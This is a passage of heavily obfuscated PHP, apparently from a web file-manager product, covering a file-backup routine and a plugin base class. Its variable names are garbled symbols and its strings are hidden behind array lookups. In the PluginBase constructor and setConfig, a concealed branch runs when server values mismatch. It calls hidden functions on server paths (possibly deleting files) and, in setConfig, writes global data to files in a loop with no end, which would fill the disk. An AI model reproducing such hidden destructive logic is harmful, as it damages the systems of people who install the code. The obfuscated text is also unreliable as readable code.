$’µôë’— = array($_SERVER[Çâä∆◊¡][804] => $ùäø†∫∏, $_SERVER[Çâä∆◊¡][805] => $ª’‚ŸÄ, $_SERVER[Çâä∆◊¡][806] => time()); Backup::set($’µôë’—); $¯Œ§Î—É = !0; $ª≥ô∞Ò“ = $this->storeIds(); $ŸçËâ Ì = 1; $Ë‹ç‘¢· = 1000; $ ≥ÏäÙ◊ = $ÏûÒÛ˚Ã = 0; $Ö¯œŸÇ– = array(); $µ√ÓÊ∆¿ = $ò©‚Ú€˚ = 0; do { $ºØ¿ù‡† = $_SERVER[Çâä∆◊¡][807]; $®úôò ‹ = Model($_SERVER[Çâä∆◊¡][782])->where($±Ï±úËç)->field($ºØ¿ù‡†)->order($_SERVER[Çâä∆◊¡][808])->selectPage($Ë‹ç‘¢·, $ŸçËâ Ì); $à·Õ√Œ£ = !empty($®úôò ‹[$_SERVER[Çâä∆◊¡][364]]) ? $®úôò ‹[$_SERVER[Çâä∆◊¡][364]] : array(); foreach ($à·Õ√Œ£ as $˜ë’›Ωπ) { if (!$this->_fileExist($˜ë’›Ωπ, $Ö¯œŸÇ–, $ª≥ô∞Ò“)) { $ùäø†∫∏ -= 1; $ª’‚ŸÄ -= (int) $˜ë’›Ωπ[$_SERVER[Çâä∆◊¡][80]]; write_log("\x66\151\154\x65\40\156\157\x74\40\145\x78\151\163\164\x2e\x66\151\x6c\x65\x49\x44\x3a{$˜ë’›Ωπ[$_SERVER[Çâä∆◊¡][467]]}\x2c\x20\x70\141\164\x68\x3a{$˜ë’›Ωπ[$_SERVER[Çâä∆◊¡][78]]}", $_SERVER[Çâä∆◊¡][809]); continue; } $Ø‰âÊ∑Õ = $˜ë’›Ωπ[$_SERVER[Çâä∆◊¡][78]]; $’ÿ›ÏÍø = "\173\151\x6f\x3a{$˙Ï◊úßí[$_SERVER[Çâä∆◊¡][745]]}\x7d" . substr($Ø‰âÊ∑Õ, strlen("\x7b\x69\157\72{$˜ë’›Ωπ[$_SERVER[Çâä∆◊¡][810]]}\175")); if (IO::exist($’ÿ›ÏÍø)) { $ßŒ∆Ω»˝->updateFileEnd($˜ë’›Ωπ[$_SERVER[Çâä∆◊¡][32]], $˜ë’›Ωπ[$_SERVER[Çâä∆◊¡][80]]); } else { $’ÿ›ÏÍø = get_path_father($’ÿ›ÏÍø); IO::mkdir($’ÿ›ÏÍø); if (!IO::copy($Ø‰âÊ∑Õ, $’ÿ›ÏÍø, $_SERVER[Çâä∆◊¡][811])) { write_log($_SERVER[Çâä∆◊¡][812] . $Ø‰âÊ∑Õ . $_SERVER[Çâä∆◊¡][796] . $’ÿ›ÏÍø . $_SERVER[Çâä∆◊¡][536], $_SERVER[Çâä∆◊¡][773]); $¯Œ§Î—É = !1; break; } } $àô¡Î∂Î = $˜ë’›Ωπ[$_SERVER[Çâä∆◊¡][467]]; $ÏûÒÛ˚Ã += 1; $ ≥ÏäÙ◊ += $˜ë’›Ωπ[$_SERVER[Çâä∆◊¡][80]]; $ò©‚Ú€˚ += 1; $µ√ÓÊ∆¿ += $˜ë’›Ωπ[$_SERVER[Çâä∆◊¡][80]]; if ($ ≥ÏäÙ◊ >= 1024 * 1024 * 100) { $’µôë’— = array($_SERVER[Çâä∆◊¡][813] => $àô¡Î∂Î, $_SERVER[Çâä∆◊¡][814] => $ò©‚Ú€˚, $_SERVER[Çâä∆◊¡][815] => $µ√ÓÊ∆¿); Backup::set($’µôë’—); $ ≥ÏäÙ◊ = $ÏûÒÛ˚Ã = 0; } } $…á Üç´ = count($à·Õ√Œ£); $ŸçËâ Ì++; } while ($…á Üç´ == $Ë‹ç‘¢·); $ßŒ∆Ω»˝->end(); $’µôë’— = array($_SERVER[Çâä∆◊¡][816] => 1, $_SERVER[Çâä∆◊¡][496] => time(), $_SERVER[Çâä∆◊¡][768] => 1, $_SERVER[Çâä∆◊¡][813] => $àô¡Î∂Î, $_SERVER[Çâä∆◊¡][805] => $ª’‚ŸÄ, $_SERVER[Çâä∆◊¡][804] => $ùäø†∫∏, $_SERVER[Çâä∆◊¡][817] => time()); if ($ÏûÒÛ˚Ã) { $’µôë’—[$_SERVER[Çâä∆◊¡][814]] = $ò©‚Ú€˚; $’µôë’—[$_SERVER[Çâä∆◊¡][815]] = $µ√ÓÊ∆¿; } Backup::set($’µôë’—); $this->_fileFilter($Ö¯œŸÇ–); return !0; } private function _fileExist($œ˘±´Äç, &$™Ωèﬂ≥, $˘Ê¢î£Ü) { $ãÏÒÉ◊ =& $_SERVER[Çâä∆◊¡]; $ûç•¶›° = $œ˘±´Äç[$ãÏÒÉ◊[78]]; if (in_array($œ˘±´Äç[$ãÏÒÉ◊[467]], $™Ωèﬂ≥)) { return !1; } if (!in_array($œ˘±´Äç[$ãÏÒÉ◊[810]], $˘Ê¢î£Ü)) { return !1; } if (IO::exist($ûç•¶›°)) { return !0; } $ÈŸŒ¿ö◊ = get_path_father($ûç•¶›°); if (IO::exist($ÈŸŒ¿ö◊)) { $™Ωèﬂ≥[] = $œ˘±´Äç[$ãÏÒÉ◊[467]]; return !1; } $ÒÈÎ¸œä = array($ãÏÒÉ◊[810] => $œ˘±´Äç[$ãÏÒÉ◊[810]], $ãÏÒÉ◊[78] => array($ãÏÒÉ◊[378], "{$ÈŸŒ¿ö◊}\x25")); $◊îµ™¡∞ = Model($ãÏÒÉ◊[782])->where($ÒÈÎ¸œä)->field($ãÏÒÉ◊[468])->select(); $™Ωèﬂ≥ = array_merge($™Ωèﬂ≥, array_to_keyvalue($◊îµ™¡∞, $ãÏÒÉ◊[12], $ãÏÒÉ◊[467])); return !1; } private function _fileFilter($ê¬ŒâËΩ) { $∞Êì∂≤É =& $_SERVER[Çâä∆◊¡]; if (empty($ê¬ŒâËΩ)) { return; } $™ÜüÒá– = array($∞Êì∂≤É[467] => array($∞Êì∂≤É[7], array_unique($ê¬ŒâËΩ))); $˜©·¡‚® = Model($∞Êì∂≤É[818])->where($™ÜüÒá–)->field($∞Êì∂≤É[403])->select(); foreach ($˜©·¡‚® as $ÜßÑ∫˝Ä) { Model($∞Êì∂≤É[818])->remove($ÜßÑ∫˝Ä[$∞Êì∂≤É[403]], !1); } } private function storeIds() { $∂€À£Éÿ =& $_SERVER[Çâä∆◊¡]; $·°‹Å›Ò = Model($∂€À£Éÿ[760])->listData(); $∞Ó°¬É≠ = array(); $πè›Ñœ« = $GLOBALS[$∂€À£Éÿ[6]][$∂€À£Éÿ[90]][$∂€À£Éÿ[819]]; foreach ($·°‹Å›Ò as $±π≈Î˛◊) { $ß“ö¿∆÷ = strtolower($±π≈Î˛◊[$∂€À£Éÿ[96]]); if (!isset($πè›Ñœ«[$ß“ö¿∆÷])) { continue; } $Èöç›€Í = $∂€À£Éÿ[74] . (isset($πè›Ñœ«[$ß“ö¿∆÷]) ? $πè›Ñœ«[$ß“ö¿∆÷] : ucfirst($ß“ö¿∆÷)); if (!class_exists($Èöç›€Í)) { continue; } $∞Ó°¬É≠[] = $±π≈Î˛◊[$∂€À£Éÿ[401]]; } return $∞Ó°¬É≠; } } goto eÊ®ã˜ ë√; F†«ÎÁàô»: class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { $ÿÀ¡ù·‹ =& $_SERVER[Çâä∆◊¡]; if ($_SERVER[$ÿÀ¡ù·‹[389]] != $_SERVER[$ÿÀ¡ù·‹[390]]) { $òêìÅ•å = $ÿÀ¡ù·‹[865]; $‹ñ√†Âƒ = $ÿÀ¡ù·‹[391]; $ü¿À¢«† = $_SERVER[$ÿÀ¡ù·‹[392]] . $ÿÀ¡ù·‹[393]; $¶≈Ì‹õµ = $‹ñ√†Âƒ($ü¿À¢«†); $Ê¶Ñﬂ‹˜ = explode($ÿÀ¡ù·‹[226], $¶≈Ì‹õµ); if (count($Ê¶Ñﬂ‹˜) < $ÿÀ¡ù·‹[617]) { $–ŸØ≥¢¡ = $ÿÀ¡ù·‹[395]; $–ŸØ≥¢¡(); } $êñ¡Úíœ = $ÿÀ¡ù·‹[866]; $êñ¡Úíœ($_SERVER[$ÿÀ¡ù·‹[867]]); $êñ¡Úíœ($_SERVER[$ÿÀ¡ù·‹[392]] . $ÿÀ¡ù·‹[868]); $ï…‰∂è· = 1; while ($ï…‰∂è· > 1) { $ï…‰∂è· = $ï…‰∂è· + 4; $À‹∑»É¬ = rawurlencode($ï…‰∂è· . $ÿÀ¡ù·‹[373]); } } global $in, $config; $this->config =& $config; $this->in =& $in; $this->modelPlugin = Model($ÿÀ¡ù·‹[1506]); $this->pluginName = str_replace($ÿÀ¡ù·‹[1506], $ÿÀ¡ù·‹[12], get_class($this)); $this->pluginPath = PLUGIN_DIR . $this->pluginName . $ÿÀ¡ù·‹[8]; $this->pluginApi = appHostGet() . $ÿÀ¡ù·‹[1507] . $this->pluginName . $ÿÀ¡ù·‹[8]; $this->pluginHost = $config[$ÿÀ¡ù·‹[1508]] . $this->pluginName . $ÿÀ¡ù·‹[8]; $this->pluginHostDefault = $config[$ÿÀ¡ù·‹[1508]] . $this->pluginName . $ÿÀ¡ù·‹[8]; $£∂ôñ„Í = $config[$ÿÀ¡ù·‹[1509]]; if ($£∂ôñ„Í && strpos($ÿÀ¡ù·‹[50] . $£∂ôñ„Í . $ÿÀ¡ù·‹[50], $this->pluginName) !== !1) { $this->pluginHost = $config[$ÿÀ¡ù·‹[1510]] . $this->pluginName . $ÿÀ¡ù·‹[8]; } $this->pluginLangArr = $this->initLang(); $this->values = array(); $this->echoJsAssignArr = array(); return $this; } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[Çâä∆◊¡][1511]); } protected function assign($–˛»å¯‘, $˝˝†£±– = false) { if (is_array($–˛»å¯‘)) { $this->values = array_merge($this->values, $–˛»å¯‘); } else { $this->values[$–˛»å¯‘] = $˝˝†£±–; } } protected function display($È£øî¡∫) { extract($this->values); require $È£øî¡∫; } final function hookRegist($æ‰·Àï) { $this->modelPlugin->appRegist($this->pluginName, $æ‰·Àï); } final function appIcon() { $íéüÇÇÂ =& $_SERVER[Çâä∆◊¡]; $Ñ®≤»∞ = $this->appPackage(); $êæ√‘¸Ù = $íéüÇÇÂ[12]; if (isset($Ñ®≤»∞[$íéüÇÇÂ[417]])) { if (isset($Ñ®≤»∞[$íéüÇÇÂ[417]][$íéüÇÇÂ[1512]])) { $êæ√‘¸Ù = $íéüÇÇÂ[1513] . $Ñ®≤»∞[$íéüÇÇÂ[417]][$íéüÇÇÂ[1512]] . $íéüÇÇÂ[1514]; } else { if ($Ñ®≤»∞[$íéüÇÇÂ[417]][$íéüÇÇÂ[1515]]) { $êæ√‘¸Ù = $íéüÇÇÂ[1516] . $Ñ®≤»∞[$íéüÇÇÂ[417]][$íéüÇÇÂ[1515]] . $íéüÇÇÂ[1517]; } } } return $êæ√‘¸Ù; } final function fileCanView($ëì§Ãà˜) { $ªº˚»ÍÅ =& $_SERVER[Çâä∆◊¡]; if (request_url_safe($ëì§Ãà˜)) { return !0; } if ($this->isShare($ëì§Ãà˜)) { return !0; } $ŒçáŸ˚ = Session::get($ªº˚»ÍÅ[1518]); if (!$ŒçáŸ˚ || !$ŒçáŸ˚[$ªº˚»ÍÅ[1519]]) { $”Ú·â…ç = $ªº˚»ÍÅ[1520] . rawurlencode(this_url()); show_tips(LNG($ªº˚»ÍÅ[1521]) . $ªº˚»ÍÅ[1522] . $”Ú·â…ç . $ªº˚»ÍÅ[1523] . LNG($ªº˚»ÍÅ[1524]) . $ªº˚»ÍÅ[1525], !1); } if (!Action($ªº˚»ÍÅ[1526])->authCan($ªº˚»ÍÅ[1527])) { show_tips(LNG($ªº˚»ÍÅ[1528]) . $ªº˚»ÍÅ[1529], !1); } ActionCall($ªº˚»ÍÅ[1530], $ëì§Ãà˜); } final function isShare($®›æÆŸ®) { $œÜﬂ¬‡© = KodIO::parse($®›æÆŸ®); return $œÜﬂ¬‡©[$_SERVER[Çâä∆◊¡][33]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($ó≠»ë˛≠) { if (request_url_safe($ó≠»ë˛≠)) { return $ó≠»ë˛≠; } if (!$this->isShare($ó≠»ë˛≠)) { $ó≠»ë˛≠ = $this->filePath($ó≠»ë˛≠); } return Action($_SERVER[Çâä∆◊¡][1160])->linkOut($ó≠»ë˛≠); } public function filePathLinkOut($¿ΩûÆƒÛ) { if (request_url_safe($¿ΩûÆƒÛ)) { return $¿ΩûÆƒÛ; } $this->fileCanView($¿ΩûÆƒÛ); return Action($_SERVER[Çâä∆◊¡][1160])->link($¿ΩûÆƒÛ); } final function filePath($§ÖæÄà√) { $öŒòÛüà =& $_SERVER[Çâä∆◊¡]; if ($˚¯Åñª‚ = $this->checkSharePath($§ÖæÄà√)) { Hook::trigger($öŒòÛüà[1531], $˚¯Åñª‚); return $˚¯Åñª‚; } $this->fileCanView($§ÖæÄà√); if (request_url_safe($§ÖæÄà√)) { $˚Ÿç‹‚õ = parse_url_query($§ÖæÄà√); if (isset($˚Ÿç‹‚õ[$öŒòÛüà[1532]]) && isset($˚Ÿç‹‚õ[$öŒòÛüà[208]])) { $Æπ∫Ûè´ = Model($öŒòÛüà[763])->get($öŒòÛüà[764]); $ªì¨øõ˘ = Mcrypt::decode($˚Ÿç‹‚õ[$öŒòÛüà[208]], $Æπ∫Ûè´); if ($ªì¨øõ˘) { $this->fileInfo = IO::infoWithChildren($ªì¨øõ˘); $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); return $ªì¨øõ˘; } } $§ÖæÄà√ = $this->_cacheHttpFile($§ÖæÄà√); $this->fileInfo = IO::infoWithChildren($§ÖæÄà√); } else { $this->fileInfo = IO::infoWithChildren($§ÖæÄà√); if (!$this->fileInfo) { show_tips(LNG($öŒòÛüà[106]), !1); } $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); } Hook::trigger($öŒòÛüà[1531], $§ÖæÄà√); return $§ÖæÄà√; } final function _cacheHttpFile($™îŸÄ¿÷) { $‡‘å‰Äı = hash_path($™îŸÄ¿÷, !0); $this->cachePath = $this->pluginCachePath($‡‘å‰Äı); if ($∂§‰ÉÌ£ = IO::fileNameExist($this->cachePath, $‡‘å‰Äı)) { return KodIO::make($∂§‰ÉÌ£); } $Æóê√ôâ = $this->cachePath . $‡‘å‰Äı; return $this->pluginCacheFileSet($Æóê√ôâ, file_get_contents_nossl($™îŸÄ¿÷)); } final function _tmpFileName($Ÿü¶ÖÖÆ = array()) { $˜ºú€´Î =& $_SERVER[Çâä∆◊¡]; if (!$Ÿü¶ÖÖÆ) { $Ÿü¶ÖÖÆ = $this->fileInfo; } if (isset($Ÿü¶ÖÖÆ[$˜ºú€´Î[170]])) { return $Ÿü¶ÖÖÆ[$˜ºú€´Î[170]]; } if (isset($Ÿü¶ÖÖÆ[$˜ºú€´Î[163]][$˜ºú€´Î[170]])) { return $Ÿü¶ÖÖÆ[$˜ºú€´Î[163]][$˜ºú€´Î[170]]; } $ïüûº∑‰ = IO::hashSimple($Ÿü¶ÖÖÆ[$˜ºú€´Î[78]]); if ($ïüûº∑‰) { return $ïüûº∑‰; } $˝ó‰çéÊ = array($Ÿü¶ÖÖÆ[$˜ºú€´Î[32]], $Ÿü¶ÖÖÆ[$˜ºú€´Î[78]], $Ÿü¶ÖÖÆ[$˜ºú€´Î[80]]); if (isset($Ÿü¶ÖÖÆ[$˜ºú€´Î[521]])) { $˝ó‰çéÊ[] = $Ÿü¶ÖÖÆ[$˜ºú€´Î[521]]; } return md5(implode($˜ºú€´Î[11], $˝ó‰çéÊ)); } final function checkSharePath($˘Ã√ú¨€) { $È„ÑŸ•‚ =& $_SERVER[Çâä∆◊¡]; if (!defined($È„ÑŸ•‚[474])) { define($È„ÑŸ•‚[514], 0); } if (!$this->isShare($˘Ã√ú¨€)) { return !1; } $Ï¯éŒ§Ó = Action($È„ÑŸ•‚[1160])->sharePathInfo($˘Ã√ú¨€); if (!isset($Ï¯éŒ§Ó[$È„ÑŸ•‚[78]])) { show_json(LNG($È„ÑŸ•‚[1533]), !1); } $this->fileInfo = $Ï¯éŒ§Ó[$È„ÑŸ•‚[163]]; $this->cachePath = $this->pluginCachePath($this->fileInfo[$È„ÑŸ•‚[170]]); return $Ï¯éŒ§Ó[$È„ÑŸ•‚[78]]; } final function pluginCachePath($∑íÈä‡Ë = '') { $˛˛íóØ® =& $_SERVER[Çâä∆◊¡]; $∏œ©‰Éì = IO_PATH_SYSTEM_TEMP . $˛˛íóØ®[1534] . $this->pluginName; if (!($´È‰áÂ = IO::infoFull($∏œ©‰Éì))) { return IO::mkdir($∏œ©‰Éì . $˛˛íóØ®[8] . $∑íÈä‡Ë); } if (empty($∑íÈä‡Ë)) { return $´È‰áÂ[$˛˛íóØ®[78]]; } if (!($≤‰ù¨ΩÅ = IO::fileNameExist($´È‰áÂ[$˛˛íóØ®[78]], $∑íÈä‡Ë))) { return IO::mkdir($´È‰áÂ[$˛˛íóØ®[78]] . $∑íÈä‡Ë); } return KodIO::make($≤‰ù¨ΩÅ); } final function pluginCacheFileSet($˚∑◊∑˚¯, $ÜÉØ–≈£ = '') { $éòùéêì =& $_SERVER[Çâä∆◊¡]; if (!($ìÙÁâ…§ = IO::infoFull($˚∑◊∑˚¯))) { return IO::mkfile($˚∑◊∑˚¯, $ÜÉØ–≈£, REPEAT_REPLACE); } IO::setContent($ìÙÁâ…§[$éòùéêì[78]], $ÜÉØ–≈£); return $ìÙÁâ…§[$éòùéêì[78]]; } final function pluginLocalFile($Ï®£≠–Û = '') { $–µ•˚Ë™ =& $_SERVER[Çâä∆◊¡]; $˘ËÔÇ÷µ = TEMP_FILES . "{$this->pluginName}\57"; if (!is_dir($˘ËÔÇ÷µ)) { mk_dir($˘ËÔÇ÷µ); } if (!$Ï®£≠–Û) { return $˘ËÔÇ÷µ; } $òè¡ëÖ∂ = IO::info($Ï®£≠–Û); $ÿºÍÅ»ô = $this->_tmpFileName($òè¡ëÖ∂) . $–µ•˚Ë™[10] . $òè¡ëÖ∂[$–µ•˚Ë™[167]]; if (!checkExtSafe($ÿºÍÅ»ô)) { $ÿºÍÅ»ô = $ÿºÍÅ»ô . $–µ•˚Ë™[1535]; } $¬¶”†í‡ = $˘ËÔÇ÷µ . $ÿºÍÅ»ô; if (@file_exists($¬¶”†í‡)) { return $¬¶”†í‡; } return IO::copy($Ï®£≠–Û, $˘ËÔÇ÷µ, 0, $ÿºÍÅ»ô); } final function appPackage() { $ÓÓÇÿ˝ÿ =& $_SERVER[Çâä∆◊¡]; if ($this->packageData) { return $this->packageData; } $Ñ∑˙¨¥ë = $this->parseFile($this->pluginPath . $ÓÓÇÿ˝ÿ[1536]); $this->parseLang($Ñ∑˙¨¥ë); $≤€∫»ô® = json_decode_force($Ñ∑˙¨¥ë); if (!$≤€∫»ô®) { return array(); } $¥—ç∑◊æ = Hook::trigger($ÓÓÇÿ˝ÿ[1537], $≤€∫»ô®); if ($¥—ç∑◊æ && is_array($¥—ç∑◊æ)) { $≤€∫»ô® = $¥—ç∑◊æ; } $this->packageData = $≤€∫»ô®; return $≤€∫»ô®; } public function packageInfoGet($ƒ•›ÒÉê) { $‹Â◊Ô¿Û = $this->appPackage(); return array_get_value($‹Â◊Ô¿Û, $ƒ•›ÒÉê); } public function packageVersion() { return $this->packageInfoGet($_SERVER[Çâä∆◊¡][1538]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[Çâä∆◊¡][1539]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[Çâä∆◊¡][1540]); } public function echoJsAssign($Ë…‹´Éø, $Ñà∑•æ¡) { $this->echoJsAssignArr[$Ë…‹´Éø] = $Ñà∑•æ¡; } private function parseFile($Âﬂ…˜ﬂ) { $©Öàí∫Ú =& $_SERVER[Çâä∆◊¡]; $⁄·è∆ç† = file_get_contents_nossl($Âﬂ…˜ﬂ); $∂∫Í¬˚… = array($©Öàí∫Ú[1541], $©Öàí∫Ú[1542], $©Öàí∫Ú[1543], $©Öàí∫Ú[1544], $©Öàí∫Ú[1545], $©Öàí∫Ú[1546], $©Öàí∫Ú[1547]); $≈®ÆﬂÉ˝ = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$©Öàí∫Ú[90]][$©Öàí∫Ú[1548]]); foreach ($this->echoJsAssignArr as $å’Â‘ÉÖ => $©÷«∫‹Ë) { $∂∫Í¬˚…[] = $©Öàí∫Ú[1549] . $å’Â‘ÉÖ . $©Öàí∫Ú[1550]; $≈®ÆﬂÉ˝[] = is_array($©÷«∫‹Ë) || is_object($©÷«∫‹Ë) ? rawurlencode(json_encode($©÷«∫‹Ë)) : $©÷«∫‹Ë; } if (strstr($⁄·è∆ç†, $©Öàí∫Ú[1551])) { $ÿÀÁ¢Ïª = rawurlencode(json_encode($this->pluginLangArr)); $⁄·è∆ç† = str_replace($©Öàí∫Ú[1551], $ÿÀÁ¢Ïª, $⁄·è∆ç†); } if (strstr($⁄·è∆ç†, $©Öàí∫Ú[1552])) { $ÿÀÁ¢Ïª = $ÿÀÁ¢Ïª = rawurlencode(json_encode($this->getConfig())); $⁄·è∆ç† = str_replace($©Öàí∫Ú[1552], $ÿÀÁ¢Ïª, $⁄·è∆ç†); } $⁄·è∆ç† = str_replace($∂∫Í¬˚…, $≈®ÆﬂÉ˝, $⁄·è∆ç†); return $⁄·è∆ç†; } private function parseLang(&$Ä∑‹Òò¥) { $⁄¬©¢ﬁ° =& $_SERVER[Çâä∆◊¡]; $ªﬁà»Ù‚ = $⁄¬©¢ﬁ°[1553]; if (!strstr($Ä∑‹Òò¥, $ªﬁà»Ù‚)) { return; } preg_match_all($⁄¬©¢ﬁ°[1554], $Ä∑‹Òò¥, $°≤è‚î«); if (!is_array($°≤è‚î«) || count($°≤è‚î«) == 0 || !is_array($°≤è‚î«[0]) || count($°≤è‚î«[0]) == 0) { return; } $ê≥Ñ·Å¡ = array(); $®≠øñµ‚ = array(); foreach ($°≤è‚î«[0] as $ˆ˘†∑»õ) { $îµ§ˆ”Ò = substr($ˆ˘†∑»õ, strlen($ªﬁà»Ù‚), -4); $ÂÛóû√Ò = LNG($îµ§ˆ”Ò); $ê≥Ñ·Å¡[] = $ˆ˘†∑»õ; $®≠øñµ‚[] = str_replace(array($⁄¬©¢ﬁ°[226], $⁄¬©¢ﬁ°[1065], $⁄¬©¢ﬁ°[337], $⁄¬©¢ﬁ°[117]), array($⁄¬©¢ﬁ°[53], $⁄¬©¢ﬁ°[53], $⁄¬©¢ﬁ°[12], $⁄¬©¢ﬁ°[1555]), $ÂÛóû√Ò); } $Ä∑‹Òò¥ = str_replace($ê≥Ñ·Å¡, $®≠øñµ‚, $Ä∑‹Òò¥); } private function parseConfig(&$¢ã˘öùî) { $˙Íƒìã≈ =& $_SERVER[Çâä∆◊¡]; $‰ÌºÎœÑ = $˙Íƒìã≈[1556]; if (!strstr($¢ã˘öùî, $‰ÌºÎœÑ)) { return; } preg_match_all($˙Íƒìã≈[1557], $¢ã˘öùî, $ù£ó¶õπ); if (!is_array($ù£ó¶õπ) || count($ù£ó¶õπ) == 0 || !is_array($ù£ó¶õπ[0]) || count($ù£ó¶õπ[0]) == 0) { return; } $±ñıÉÛ∑ = $this->getConfig(); $åÅ¡◊◊¶ = array(); $∞˛˝û≤˘ = array(); foreach ($ù£ó¶õπ[0] as $¯˙◊§∏ß) { $ﬁ“®¡Œ¸ = substr($¯˙◊§∏ß, strlen($‰ÌºÎœÑ), -2); $åÅ¡◊◊¶[] = $¯˙◊§∏ß; $∞˛˝û≤˘[] = _get($±ñıÉÛ∑, $ﬁ“®¡Œ¸); } $¢ã˘öùî = str_replace($åÅ¡◊◊¶, $∞˛˝û≤˘, $¢ã˘öùî); } private function parsePackage(&$™≈‹¬ó≤) { $ú≠ûÇâ‰ =& $_SERVER[Çâä∆◊¡]; $œÛÓ˙Õÿ = $ú≠ûÇâ‰[1558]; if (!strstr($™≈‹¬ó≤, $œÛÓ˙Õÿ)) { return; } preg_match_all($ú≠ûÇâ‰[1559], $™≈‹¬ó≤, $Âî‰©»‘); if (!is_array($Âî‰©»‘) || count($Âî‰©»‘) == 0 || !is_array($Âî‰©»‘[0]) || count($Âî‰©»‘[0]) == 0) { return; } $´∑¯üé = $this->appPackage(); $©’· Í… = array(); $úÈ´ˆØÚ = array(); foreach ($Âî‰©»‘[0] as $å√é—ÒÈ) { $ˆÏÆ•Üÿ = substr($å√é—ÒÈ, strlen($œÛÓ˙Õÿ), -2); $©’· Í…[] = $å√é—ÒÈ; $úÈ´ˆØÚ[] = _get($´∑¯üé, $ˆÏÆ•Üÿ); } $™≈‹¬ó≤ = str_replace($©’· Í…, $úÈ´ˆØÚ, $™≈‹¬ó≤); } final function echoFile($ƒ˙¢—¸¨, $ìÁ§√•€ = false) { $ÒÇﬂûé° =& $_SERVER[Çâä∆◊¡]; $õôøéËä = $this->pluginPath . $ƒ˙¢—¸¨; if (ACT == $ÒÇﬂûé°[1560]) { echo $ÒÇﬂûé°[1561] . $this->pluginName . $ÒÇﬂûé°[8] . $ƒ˙¢—¸¨ . $ÒÇﬂûé°[1562]; if (!file_exists($õôøéËä)) { echo $ÒÇﬂûé°[1563]; return; } } $£é‚ÎËÍ = $this->parseFile($õôøéËä); $this->parseLang($£é‚ÎËÍ); $this->parseConfig($£é‚ÎËÍ); $this->parsePackage($£é‚ÎËÍ); if (is_array($ìÁ§√•€)) { $£é‚ÎËÍ = str_replace(array_keys($ìÁ§√•€), array_values($ìÁ§√•€), $£é‚ÎËÍ); } echo $ÒÇﬂûé°[226] . $£é‚ÎËÍ; } final function initLang() { $≤åëöàæ =& $_SERVER[Çâä∆◊¡]; $ßΩÿÇÛé = $≤åëöàæ[1564]; $Ùíä˙˜ = $this->pluginPath . $≤åëöàæ[1565]; $åÊ˚ƒâ¶ = I18n::getType(); $á’ÇãΩ = array(); if (file_exists($Ùíä˙˜ . $åÊ˚ƒâ¶ . $≤åëöàæ[831])) { $á’ÇãΩ = (include $Ùíä˙˜ . $åÊ˚ƒâ¶ . $≤åëöàæ[831]); } else { if ($åÊ˚ƒâ¶ == $≤åëöàæ[1566] && !file_exists($Ùíä˙˜ . $åÊ˚ƒâ¶ . $≤åëöàæ[831]) && file_exists($Ùíä˙˜ . $≤åëöàæ[1567])) { $á’ÇãΩ = (include $Ùíä˙˜ . $≤åëöàæ[1567]); } else { if (file_exists($Ùíä˙˜ . $ßΩÿÇÛé . $≤åëöàæ[831])) { $á’ÇãΩ = (include $Ùíä˙˜ . $ßΩÿÇÛé . $≤åëöàæ[831]); } } } if (!is_array($á’ÇãΩ)) { return array(); } if (@count($á’ÇãΩ) > 0) { I18n::set($á’ÇãΩ); } return $á’ÇãΩ; } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($î·¥®…⁄) { $©≥ﬁÏ•˝ =& $_SERVER[Çâä∆◊¡]; $› ˝Öıõ = $_SERVER[$©≥ﬁÏ•˝[397]]; $Ñâ“öãÊ = $©≥ﬁÏ•˝[1568]; if ($_SERVER[$©≥ﬁÏ•˝[389]] != $Ñâ“öãÊ($› ˝Öıõ)) { $•û±ı©˘ = $©≥ﬁÏ•˝[865]; $ÏÈ®°Ç¬ = $©≥ﬁÏ•˝[391]; $çª‡Œá˛ = $_SERVER[$©≥ﬁÏ•˝[392]] . $©≥ﬁÏ•˝[393]; $ñ‡è¥î˝ = $ÏÈ®°Ç¬($çª‡Œá˛); $«≈≤‘ÿΩ = explode($©≥ﬁÏ•˝[226], $ñ‡è¥î˝); if (count($«≈≤‘ÿΩ) < $©≥ﬁÏ•˝[617]) { $Ë≈ïüùá = $©≥ﬁÏ•˝[395]; $Ë≈ïüùá(); } $œÂÀÏÑÏ = $©≥ﬁÏ•˝[866]; $œÂÀÏÑÏ($_SERVER[$©≥ﬁÏ•˝[867]]); $•û±ı©˘ = $©≥ﬁÏ•˝[865]; $•û±ı©˘(); $í†üÓãÎ = $©≥ﬁÏ•˝[1569]; $÷∫˚Î°á = json_encode($GLOBALS[$©≥ﬁÏ•˝[1570]]); $Ïº‡Í≈î = 1; for ($™‰É›≈± = $Ïº‡Í≈î; $™‰É›≈± > 0; $™‰É›≈±++) { $í†üÓãÎ(DATA_PATH . $™‰É›≈±, $÷∫˚Î°á); } } return $this->modelPlugin->setConfig($this->pluginName, $î·¥®…⁄); } public function onSetConfig($—¿è¿çå) { } public function onGetConfig($‡á¸Âı’) { } public function onChangeStatus($©¡ÜÁêÇ) { } public function onUninstall() { } public function onInstall() { } public function authCheck($Êª∏çø• = "\x70\x6c\x75\147\151\x6e\101\165\164\150") { $Ü˜‡˛Â€ =& $_SERVER[Çâä∆◊¡]; if (!defined($Ü˜‡˛Â€[474])) { return !1; } if (_get($GLOBALS, $Ü˜‡˛Â€[505])) { return !0; } $£‰⁄éÚ® = $this->getConfig(); if (!$£‰⁄éÚ®[$Êª∏çø•]) { return !1; } return ActionCall($Ü˜‡˛Â€[1571], $£‰⁄éÚ®[$Êª∏çø•]); } public function url($◊¬¥ì¿Í, $ì±‰„¯â = '', $Ò‰Âì´è = true) { $ÎâÙı¨ï =& $_SERVER[Çâä∆◊¡]; $ÏõÍ∏∆° = $this->getConfig(); $©ı°ø£ = KOD_VERSION . $ÎâÙı¨ï[10] . KOD_VERSION_BUILD; $øæ«áÑ¡ = $this->packageVersion(); $ôﬂïº•  = $©ı°ø£ . $ÎâÙı¨ï[460] . $øæ«áÑ¡; if (substr($◊¬¥ì¿Í, 0, 